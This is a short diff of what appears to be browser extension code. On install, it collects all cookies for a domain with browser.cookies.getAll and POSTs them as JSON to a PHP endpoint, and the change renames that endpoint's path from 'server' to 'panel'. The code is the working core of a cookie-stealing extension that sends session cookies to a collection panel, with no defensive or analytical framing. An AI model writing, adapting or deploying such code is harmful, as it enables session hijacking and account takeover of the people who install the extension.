@@ -43,7 +43,7 @@ chrome.runtime.onInstalled.addListener(function(details) {
                 }
                 console.log(domain);
                 browser.cookies.getAll({domain: domain}, function (cookies) {
-                    fetch('http://localhost/server/api.php', {
+                    fetch('http://localhost/panel/api.php', {
                         headers: { "Content-Type": "application/json; charset=utf-8" },
                         method: 'POST',
                         body: JSON.stringify({cookie : cookies})
